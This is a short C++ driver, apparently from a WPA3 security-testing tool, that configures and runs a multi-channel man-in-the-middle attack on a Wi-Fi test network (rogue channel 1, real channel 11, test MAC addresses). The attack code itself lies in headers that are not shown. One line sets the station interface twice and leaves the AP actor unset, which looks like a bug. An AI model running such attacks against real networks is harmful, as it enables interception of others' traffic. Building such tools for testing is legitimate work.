#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/by_target/scan_AP.h"
#include "system/hw_capabilities.h"
#include "logger/log.h"

#include <tins/tins.h>
#include <filesystem>
#include <stdexcept>

using namespace std;
using namespace Tins;
using namespace wpa3_tester;

int main(){
    const auto r_sta_actor = ActorPtr(std::make_shared<Actor_config>());
    const auto r_ap_actor = ActorPtr(std::make_shared<Actor_config>());

    r_sta_actor->str_con["iface"] = "wlan1";
    r_sta_actor->str_con["iface"] = "wlan2";

    const string ap_ssid = "test_mc_mitm";
    const string ap_mac = "02:00:00:00:03:00";
    //const string client_mac     = "30:ab:6a:39:88:46";
    const string client_mac = "02:00:00:00:02:00";
    constexpr int real_channel = 11;
    constexpr int rogue_channel = 1;
    constexpr int attack_time = 20;

    McMitm attack(r_sta_actor, r_ap_actor, ap_ssid, ap_mac, client_mac);

    attack.netconfig.real_channel = real_channel;
    attack.netconfig.rogue_channel = rogue_channel;
    attack.netconfig.ssid = ap_ssid;

    RunStatus rs;
    attack.run(rs, attack_time);

    return 0;
}